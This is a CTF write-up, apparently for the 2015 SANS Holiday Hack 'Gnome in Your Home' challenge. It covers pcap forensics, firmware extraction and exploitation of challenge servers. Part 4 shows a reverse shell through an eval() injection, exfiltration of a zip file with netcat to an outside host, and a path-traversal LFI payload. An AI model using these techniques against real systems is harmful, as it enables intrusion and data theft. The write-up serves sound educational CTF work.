@@ -1,0 +1,479 @@
+<h1 id="part-1">Part 1</h1>
+<h2 id="process">Process</h2>
+<p>We are given a packet capture to analyze, <code>giyh-capture.pcap</code>. Let&#39;s open it in
+Wireshark:</p>
+<p><img src="1.png" alt="1"></p>
+<p>That&#39;s quite a lot of 802.11 control packets. I doubt that&#39;s the control
+channel, though. Let&#39;s take a look at those DNS requests, those seem more
+interesting. We can filter by using the filter expression <code>dns</code>:</p>
+<p><img src="2.png" alt="2"></p>
+<p>Looks like some of those queries are for &quot;cmd.sg1.atnascorp.com&quot;. That seems
+awfully suspicious. Let&#39;s look at a response for one of those queries:</p>
+<p><img src="3.png" alt="3"></p>
+<p>Looks like base64 encoding. Let&#39;s bring up a shell and try it:</p>
+<pre><code class="lang-sh">ruby :: holidayhack/part1 » echo Tk90RTo= | base64 -d
+NOtE:
+</code></pre>
+<p>Yep. Looks like all of the other replies for &quot;cmd.sg1.atnascorp.com&quot; are the
+same thing. Let&#39;s look at the responses for &quot;reply.sg1.atnascorp.com&quot; instead.
+All of them have a transaction ID of 0x1337, so we can simply use the filter
+expression <code>dns.id == 0x1337</code>.</p>
+<p>Looking at the first response:</p>
+<pre><code class="lang-sh">ruby :: holidayhack/part1 » echo RVhFQzpTVEFSVF9TVEFURQ== | base64 -d
+EXEC:START_STATE
+</code></pre>
+<p>Yep, this is definitely what we want. Unfortunately, this is too much data to
+analyze using copy-paste from Wireshark. Fortunately, we can use the <code>tshark</code>
+command-line tool to extract the data we want:</p>
+<pre><code class="lang-sh">ruby :: holidayhack/part1 » tshark -Tfields -e dns.txt -r giyh-capture.pcap &quot;dns.id == 0x1337&quot;
+RVhFQzpTVEFSVF9TVEFURQ==
+- snip -
+RVhFQzogICAgICAgICAgICAgICAgICAgIENoYW5uZWw6Ngo=
+</code></pre>
+<p>Essentially, what we are doing is taking every packet that matches our filter
+expression <code>dns.id == 0x1337</code> and getting the value of the <code>dns.txt</code> field,
+which is the query response. Now we can do some analysis. Let&#39;s start by
+getting <code>tshark</code>&#39;s output into a file:</p>
+<pre><code class="lang-sh">ruby :: holidayhack/part1 » !! &gt; query_responses
+ruby :: holidayhack/part1 »
+</code></pre>
+<p>And let&#39;s base64 decode every line in that file:</p>
+<pre><code class="lang-sh">ruby :: holidayhack/part1 » for i in `cat query_responses`; do
+echo $(echo $i | base64 -d)
+done | nl | less
+</code></pre>
+<p>The output is piped to <code>nl</code> so we can get line numbers, and piped to <code>less</code> so
+we can review it for anything interesting manually. As it turns out, there is
+something very interesting. On line 84, we see a command being sent:</p>
+<pre><code>    84  FILE:START_STATE,NAME=/root/Pictures/snapshot_CURRENT.jpg
+</code></pre><p>The following lines contain binary data with the JPEG image.</p>
+<p>Now to actually extract the file. Josh started writing a script for us, but I
+decided to ignore it, since he claimed it was broken. We know that every line
+is base64 encoded, and every line starts with the string <code>FILE:</code>. We know that
+the last line is an end marker, so we should ignore that as well. Keeping all
+that in mind, we can write a script to:</p>
+<ul>
+<li>Give us lines starting at the 85th line</li>
+<li>Give us characters starting at the 6th character (&quot;FILE:&quot; is 5 characters)</li>
+<li>Skip the last line</li>
+<li>Not write newlines between commands</li>
+<li>Output all of this to an image</li>
+</ul>
+<p>I implemented this in Python. Here&#39;s the source:</p>
+<pre><code class="lang-py"># The DNS responses are base64-encoded
+import base64
+
+# We want lines starting at the 85th, but we&#39;re using a zero-based system
+lines = [i.strip() for i in open(&quot;query_responses&quot;).readlines()][84:] 
+
+# Let&#39;s have the image data accumulate in this variable
+image_data = b&quot;&quot;
+
+for line in lines:
+    # We want to base64 decode the entire line, then take everything past the
+    # 5th character (&quot;FILE:&quot; is 5 characters). Let&#39;s add it to the variable
+    # we defined above
+    image_data += base64.b64decode(line)[5:]
+
+# Great, now all of our data is in the image_data variable. Let&#39;s write it out
+# to an image so we can actually use it:
+
+with open(&quot;image.jpg&quot;, &quot;wb&quot;) as image_file:
+    image_file.write(image_data)
+</code></pre>
+<p>Once we run this script, we get the file &quot;image.jpg&quot;, which appears to contain
+a picture of a bedroom:</p>
+<p><img src="image.jpg" alt="The decoded image"></p>
+<p>There you have it! We&#39;re done with Part 1!</p>
+<h2 id="answer">Answer</h2>
+<h3 id="a">a</h3>
+<p>The <code>FILE:START_STATE</code> command is sent, indicating that a file is about to be
+sent across the network.</p>
+<h3 id="b">b</h3>
+<p>The image is shown above.</p>
+<h1 id="part-2">Part 2</h1>
+<h2 id="process">Process</h2>
+<p>This time, we&#39;re given a firmware image, and asked to try to retrieve a password
+from it. In addition, we are to answer the following questions:</p>
+<ul>
+<li>What operating system and CPU type are in the Gnome? What type of
+web framework is the web interface built in?</li>
+<li>What kind of a database engine is used to support the Gnome&#39;s web interface?
+What is the plaintext password?</li>
+</ul>
+<p>One of my favorite tools for firmware analysis is <code>binwalk</code>. It &quot;walks&quot; across
+a file, and tries to find file headers that match types that it knows about.
+Let&#39;s try running it on our firmware image:</p>
+<pre><code class="lang-sh">ruby :: holidayhack/part2 » binwalk giyh-firmware-dump.bin 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PEM certificate
+1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
+168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 18:47:32 2015
+</code></pre>
+<p>Aha! That Squashfs filesystem most likely has the files we need. Let&#39;s first
+extract it from the image using <code>binwalk -e</code>:</p>
+<pre><code class="lang-sh">ruby :: holidayhack/part2 » binwalk -e giyh-firmware-dump.bin 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PEM certificate
+1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
+168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 18:47:32 2015
+
+ruby :: holidayhack/part2 » cd _giyh-firmware-dump.bin.extracted 
+ruby :: part2/_giyh-firmware-dump.bin.extracted » ls
+0.crt  29363.squashfs
+</code></pre>
+<p>Now we have our Squashfs image. We can extract it using the <code>unsquashfs</code>
+utility (from the <code>squashfs-tools</code> package). Let&#39;s do that:</p>
+<pre><code class="lang-sh">ruby :: part2/_giyh-firmware-dump.bin.extracted » unsquashfs 29363.squashfs 
+Parallel unsquashfs: Using 4 processors
+3936 inodes (5763 blocks) to write
+
+[===================================================================================================================/] 5763/5763 100%
+
+created 3899 files
+created 930 directories
+created 37 symlinks
+created 0 devices
+created 0 fifos
+</code></pre>
+<p>Now, we have the Gnome&#39;s root filesystem in the <code>squashfs-root</code> folder. Let&#39;s
+see if there&#39;s anything interesting:</p>
+<pre><code class="lang-sh">ruby :: _giyh-firmware-dump.bin.extracted/squashfs-root » ls
+bin  etc  init  lib  mnt  opt  overlay  rom  root  sbin  tmp  usr  var  www
+ruby :: _giyh-firmware-dump.bin.extracted/squashfs-root » file init 
+init: POSIX shell script, ASCII text executable
+</code></pre>
+<p>Huh, that&#39;s interesting. <code>init</code> usually isn&#39;t in the root directory, and it&#39;s
+usually not a text file. Let&#39;s take a look:</p>
+<pre><code class="lang-sh">ruby :: _giyh-firmware-dump.bin.extracted/squashfs-root » cat init 
+#!/bin/sh
+# Copyright (C) 2006 OpenWrt.org
+export INITRAMFS=1
+exec /sbin/init
+</code></pre>
+<p>That copyright string is helpful. It means that the operating system running is
+likely OpenWRT, which is Linux-based. Let&#39;s take a quick look at <code>/sbin/init</code>,
+and see if it has any clues:</p>
+<pre><code class="lang-sh">ruby :: _giyh-firmware-dump.bin.extracted/squashfs-root » file sbin/init
+sbin/init: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-armhf.so.1, stripped
+</code></pre>
+<p>So the gnome has an ARM processor. That could come in handy later.</p>
+<p>That <code>www</code> folder seemed interesting. Let&#39;s look there next:</p>
+<pre><code class="lang-sh">ruby :: _giyh-firmware-dump.bin.extracted/squashfs-root » cd www 
+ruby :: squashfs-root/www » ls
+app.js  bin  files  node_modules  package.json  public  routes  views
+</code></pre>
+<p>Hmm, <code>app.js</code>? <code>node_modules</code>? Sounds like this is a Node.js application.
+Let&#39;s take a look at <code>app.js</code> to see if we can find anything more:</p>
+<pre><code class="lang-sh">ruby :: squashfs-root/www » cat app.js
+var express = require(&#39;express&#39;);
+- snip -
+var mongo = require(&#39;mongodb&#39;);
+var monk = require(&#39;monk&#39;);
+var db = monk(&#39;gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome&#39;)
+
+var app = express();
+- snip -
+</code></pre>
+<p>This gives us a lot of helpful information. We now know that the web interface
+is based on node.js, using the Express framework, and that it is using MongoDB
+as a database backend. Let&#39;s take a look to see if we can find the web
+interface password from MongoDB&#39;s data files. First, let&#39;s try to find MongoDB&#39;s
+data directory:</p>
+<pre><code class="lang-sh">ruby :: squashfs-root/etc » cat mongod.conf 
+- snip -
+storage:
+  dbPath: /opt/mongodb
+- snip -
+</code></pre>
+<p>Okay, let&#39;s take a look in <code>/opt/mongodb</code> then:</p>
+<pre><code class="lang-sh">ruby :: _giyh-firmware-dump.bin.extracted/squashfs-root » cd opt/mongodb 
+ruby :: opt/mongodb » ls
+gnome.0  gnome.ns  journal  local.0  local.ns  _tmp
+</code></pre>
+<p>Let&#39;s use the tool <code>strings</code> to take a look at the <code>gnome.0</code> file. What
+<code>strings</code> will do is find all groups of printable characters in the given file
+longer than a certain length, and show them to us. If we&#39;re lucky, the password
+will be among those groups. Let&#39;s try it:</p>
+<pre><code class="lang-sh">ruby :: opt/mongodb » strings gnome.0
+- snip -
+username
+admin
+password
+SittingOnAShelf
+- snip -
+</code></pre>
+<p>Aha! Looks like the password is &quot;SittingOnAShelf&quot;.</p>
+<h2 id="answer">Answer</h2>
+<h3 id="a">a</h3>
+<p>Some Linux distribution is running on an ARM processor on the Gnome (firmware
+suggests that it is OpenWRT). The web framework used is Express, which uses
+Node.js.</p>
+<h3 id="b">b</h3>
+<p>MongoDB is used to support the web interface. The plain-text password is
+&quot;SittingOnAShelf&quot;.</p>
+<h1 id="part-3">Part 3</h1>
+<h2 id="process">Process</h2>
+<p>In this part, we are told to locate &quot;SuperGnomes&quot;, which are some sort of master
+control nodes. The hint &quot;sho Dan&quot; of course points to the Shodan.io tool, which
+allows us to search the Internet for devices that match a query. One way to
+target Gnome devices would be to use the title of the index page they display.
+Let&#39;s take a look at one the index template:</p>
+<pre><code class="lang-sh">ruby :: squashfs-root/www » cat views/index.jade 
+extends layout
+- snip -
+</code></pre>
+<p>Okay, let&#39;s go to the layout template:</p>
+<pre><code class="lang-sh">ruby :: squashfs-root/www » cat views/layout.jade 
+- snip -
+    head
+      title= title
+- snip -
+</code></pre>
+<p>Let&#39;s take a look at where these pages are rendered to get the value of the
+<code>title</code> variable:</p>
+<pre><code class="lang-sh">ruby :: squashfs-root/www » cat routes/index.js | grep title
+      res.render(&#39;index&#39;, { title: &#39;GIYH::ADMIN PORT V.01&#39;, session: sessions[sessionid], res: res });
+- snip -
+</code></pre>
+<p>Now that we know the webpage title, let&#39;s try searching some of those words in
+Shodan:</p>
+<p><img src="4.png" alt="Shodan search results"></p>
+<p>Awesome. Excluding &quot;92.84.56.10&quot; (which doesn&#39;t seem to be part of the
+challenge), we have five nodes, presumably SuperGnomes. Let&#39;s go confirm them
+with Tom:</p>
+<p><img src="5.png" alt="Thanks, Tom">
+<img src="6.png" alt="Thanks, Tom">
+<img src="7.png" alt="Thanks, Tom">
+<img src="8.png" alt="Thanks, Tom">
+<img src="9.png" alt="Thanks, Tom"></p>
+<h2 id="answer">Answer</h2>
+<p>Our nodes are:</p>
+<ul>
+<li>54.233.105.81, in Brazil, SG-05</li>
+<li>52.192.152.132, in Japan, SG-04</li>
+<li>52.2.229.189, in the US (Ashburn), SG-01</li>
+<li>52.64.191.71, in Australia, SG-03</li>
+<li>52.34.3.80, in the US (Boardman), SG-02</li>
+</ul>
+<h1 id="part-4">Part 4</h1>
+<p>Let&#39;s exploit some vulnerabilities!</p>
+<h2 id="sg-01-52-2-229-189">SG-01 / 52.2.229.189</h2>
+<p>This one was easy. We can just log in with the username and password given to
+us, and then download files from the &quot;Files&quot; section, which looks like this:</p>
+<p><img src="10.png" alt="Files"></p>
+<p>The contents of <code>gnome.conf</code> for this node are:</p>
+<pre><code>Gnome Serial Number: NCC1701
+Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
+Allow new subordinates?: YES
+Camera monitoring?: YES
+Audio monitoring?: YES
+Camera update rate: 60min
+Gnome mode: SuperGnome
+Gnome name: SG-01
+Allow file uploads?: YES
+Allowed file formats: .png
+Allowed file size: 512kb
+Files directory: /gnome/www/files/
+</code></pre><p>Nice Star Trek reference.</p>
+<p>Those other files could be interesting, too. One of them, 20141226101055.zip,
+is mentioned in the story. Let&#39;s analyze that now.</p>
+<p>Another packet capture is contained within the zip file. Let&#39;s open it in
+Wireshark:</p>
+<p><img src="11.png" alt="More Wireshark"></p>
+<p>Hmm, not very helpful. Let&#39;s use the &quot;Follow Stream&quot; tool:</p>
+<p><img src="12.png" alt="Following the stream"></p>
+<p>Looks like some email. Here&#39;s the text:</p>
+<pre><code>JoJo,
+
+As you know, I hired you because you are the best architect in town for a
+distributed surveillance system to satisfy our rather unique business
+requirements.  We have less than a year from today to get our final plans in
+place.  Our schedule is aggressive, but realistic.
+
+I&#39;ve sketched out the overall Gnome in Your Home architecture in the diagram
+attached below.  Please add in protocol details and other technical
+specifications to complete the architectural plans.
+
+Remember: to achieve our goal, we must have the infrastructure scale to
+upwards of 2 million Gnomes.  Once we solidify the architecture, you&#39;ll work
+with the hardware team to create device specs and we&#39;ll start procuring
+hardware in the February 2015 timeframe.
+
+I&#39;ve also made significant progress on distribution deals with retailers.
+Thoughts?
+Looking forward to working with you on this project!
+ -C
+</code></pre><p>There are some attachments, as well. The first one is an image called
+&quot;GiYH_Architecture.jpg&quot;. After extracting it from the stream:</p>
+<p><img src="GiYH_Architecture.jpg" alt="Architecture diagram"></p>
+<p>We also find <code>sgnet.zip</code>, which, when extracted, gives us some C source code for
+a status daemon. This may come in handy later.</p>
+<h2 id="sg-04-52-192-152-132">SG-04 / 52.192.152.132</h2>
+<p>This is a special node. It allows us to upload files:</p>
+<p><img src="13.png" alt="File uploading"></p>
+<p>But only certain types of files:</p>
+<p><img src="14.png" alt="Nothing but PNGs"></p>
+<p>Let&#39;s go back and look at the code for uploading files. There&#39;s an interesting
+line in the part that performs postprocessing:</p>
+<pre><code class="lang-javascript">d.run(function() {
+  result = eval(&#39;(&#39; + postproc_syntax + &#39;)&#39;);
+});
+</code></pre>
+<p>Seeing <code>eval</code> is never good. A second look at the upload page and my hopes
+(fears?) are confirmed:</p>
+<p><img src="15.png" alt="Arbitrary code execution"></p>
+<p>This is great! Let&#39;s send something of our own, perhaps some JavaScript to
+launch a reverse shell?</p>
+<p>On my server machine:</p>
+<pre><code class="lang-sh">sapphire :: ~ » nc -l -p 18623
+</code></pre>
+<p>And in the application, with a little help from <a href="https://github.com/evilpacket/node-shells/">the internet</a>:</p>
+<p><img src="16.png" alt="The postprocessor to end all postprocessors"></p>
+<p>And hey, we have a shell:</p>
+<p><img src="17.png" alt="Look at that"></p>
+<p>Now let&#39;s just go get that gnome.conf:</p>
+<p><img src="18.png" alt="There it is"></p>
+<p>We also want the zip file that&#39;s in /gnome/www/files, so let&#39;s get that too.
+It&#39;s not really a good idea to run <code>cat</code> on it over this connection, so let&#39;s
+just send it over another pipe:</p>
+<pre><code class="lang-sh">ls /gnome/www/files
+20151203133815.zip
+- snip -
+cat /gnome/www/files/20151203133815.zip | nc home.fwilson.me 18626
+</code></pre>
+<p>On <code>home.fwilson.me</code> I had a listener set up like this:</p>
+<pre><code>sapphire :: ~ » nc -l -p 18626 &gt; 20151203133815.zip
+</code></pre><p>I fetched <code>factory_cam_4.zip</code> in a similar way.</p>
+<p>So, now we have another zip file! Let&#39;s analyze it. Upon extraction, we get
+another packet capture file. It&#39;s similar to the last one in structure. There
+is another email. The text is:</p>
+<pre><code>Dr. O&#39;Malley,
+
+In your recent email, you inquired:
+
+&gt; When did you first notice your anxiety about the holiday season?
+
+Anxiety is hardly the word for it.  It&#39;s a deep-seated hatred, Doctor.
+
+Before I get into details, please allow me to remind you that we operate
+under the strictest doctor-patient confidentiality agreement in the
+business.  I have some very powerful lawyers whom I&#39;d hate to invoke in the
+event of some leak on your part.  I seek your help because you are the best
+psychiatrist in all of Who-ville.
+
+To answer your question directly, as a young child (I must have been no more
+than two), I experienced a life-changing interaction.  Very late on
+Christmas Eve, I was awakened to find a grotesque green Who dressed in a
+tattered Santa Claus outfit, standing in my barren living room, attempting
+to shove our holiday tree up the chimney.  My senses heightened, I put on my
+best little-girl innocent voice and asked him what he was doing.  He
+explained that he was &quot;Santy Claus&quot; and needed to send the tree for repair.
+I instantly knew it was a lie, but I humored the old thief so I could escape
+to the safety of my bed.  That horrifying interaction ruined Christmas for
+me that year, and I was terrified of the whole holiday season throughout my
+teen years.
+
+I later learned that the green Who was known as &quot;the Grinch&quot; and had lost
+his mind in the middle of a crime spree to steal Christmas presents.  At the
+very moment of his criminal triumph, he had a pitiful change of heart and
+started playing all nicey-nice.  What an amateur!  When I became an adult,
+my fear of Christmas boiled into true hatred of the whole holiday season.  I
+knew that I had to stop Christmas from coming.  But how?
+
+I vowed to finish what the Grinch had started, but to do it at a far larger
+scale.  Using the latest technology and a distributed channel of burglars,
+we&#39;d rob 2 million houses, grabbing their most precious gifts, and selling
+them on the open market.  We&#39;ll destroy Christmas as two million homes full
+of people all cry &quot;BOO-HOO&quot;, and we&#39;ll turn a handy profit on the whole
+deal.
+
+Is this &quot;wrong&quot;?  I simply don&#39;t care.  I bear the bitter scars of the
+Grinch&#39;s malfeasance, and singing a little &quot;Fahoo Fores&quot; isn&#39;t gonna fix
+that!
+
+What is your advice, doctor?
+
+Signed,
+
+Cindy Lou Who
+</code></pre><p>The relevant headers are:</p>
+<pre><code>From: &quot;c&quot; &lt;c@atnascorp.com&gt;
+To: &lt;psychdoctor@whovillepsychiatrists.com&gt;
+</code></pre><p>This is the same &quot;c&quot; that sent the last email. Looks like we have her identity
+now: it&#39;s &quot;Cindy Lou Who&quot;.</p>
+<h2 id="sg-02-52-34-3-80">SG-02 / 52.34.3.80</h2>
+<p>Poking around the admin interface a bit, we see something very interesting in
+the settings interface:</p>
+<p><img src="19.png" alt="Upload settings"></p>
+<p>We can upload settings files. Let&#39;s try it!</p>
+<p><img src="20.png" alt="Insufficient space"></p>
+<p>...oh. So, we can&#39;t upload files, but it looks like we can create directories.
+That doesn&#39;t seem very helpful right now, but it might come in handy, when
+combined with an LFI vulnerability from the firmware image:</p>
+<pre><code class="lang-javascript">  var camera = unescape(req.query.camera);
+  // check for .png
+  //if (camera.indexOf(&#39;.png&#39;) == -1) // STUART: Removing this...I think this is a better solution... right?
+  camera = camera + &#39;.png&#39;; // add .png if its not found
+  console.log(&quot;Cam:&quot; + camera);
+  fs.access(&#39;./public/images/&#39; + camera, fs.F_OK | fs.R_OK, function(e) {
+    if (e) {
+            res.end(&#39;File ./public/images/&#39; + camera + &#39; does not exist or access denied!&#39;);
+    }
+  });
+  fs.readFile(&#39;./public/images/&#39; + camera, function (e, data) {
+    res.end(data);
+  });
+</code></pre>
+<p>It turns out that this camera actually does the &quot;.png&quot; check. How could we get
+a &quot;.png&quot; in the path? By creating a temporary directory somewhere called &quot;.png&quot;.
+Let&#39;s try it:</p>
+<p><img src="21.png" alt="Creating the directory..."></p>
+<p><img src="22.png" alt="Hey, it works"></p>
+<p>Awesome. So now we can use <code>/gnome/www/public/upload/ljAndVtO/.png/</code> in our
+exploit of the <code>/cam</code> route with an LFI vulnerability. The base path for files
+fetched with <code>/cam</code> is &quot;/gnome/www/public/images/&quot;. We need to get to
+&quot;/gnome/www/public/upload/ljAndVtO/.png/&quot;, then to
+&quot;/gnome/www/files/gnome.conf&quot;. So, we should be able to fetch this path:
+<code>../upload/ljAndVtO/.png/../../../../files/gnome.conf</code> and get the
+configuration! Let&#39;s try it:</p>
+<p><img src="23.png" alt="I can&#39;t believe that actually worked :D"></p>
+<p>I fetched <code>factory_cam_2.zip</code> in the same way.</p>
+<p>Looks like there&#39;s an XKCD reference in there, too. The challenge writers have
+good taste in webcomics :)</p>
+<p>And let&#39;s not forget the other file we want, &quot;20150225093040.zip&quot;. Unzipping it,
+we see another packet capture. Here&#39;s the email we get from it:</p>
+<pre><code>Maratha,
+
+As a follow-up to our phone conversation, we&#39;d like to proceed with an order
+of parts for our upcoming product line.  We&#39;ll need two million of each of
+the following components:
+
++ Ambarella S2Lm IP Camera Processor System-on-Chip (with an ARM Cortex A9
+CPU and Linux SDK)
++ ON Semiconductor AR0330: 3 MP 1/3&quot; CMOS Digital Image Sensor
++ Atheros AR6233X Wi-Fi adapter
++ Texas Instruments TPS65053 switching power supply
++ Samsung K4B2G16460 2GB SSDR3 SDRAM
++ Samsung K9F1G08U0D 1GB NAND Flash
+
+Given the volume of this purchase, we fully expect the 35% discount you
+mentioned during our phone discussion.  If you cannot agree to this pricing,
+we&#39;ll place our order elsewhere.
+
+We need delivery of components to begin no later than April 1, 2015, with
+250,000 units coming each week, with all of them arriving no later than June
+1, 2015.
+
+Finally, as you know, this project requires the utmost secrecy.   Tell NO
+ONE about our order, especially any nosy law enforcement authorities.
+
+Regards,
+
+-CW
+</code></pre><p>This is, again, from the same <code>c@atnascorp.com</code> as every other email.</p>
+<h2 id="static-images">Static Images</h2>
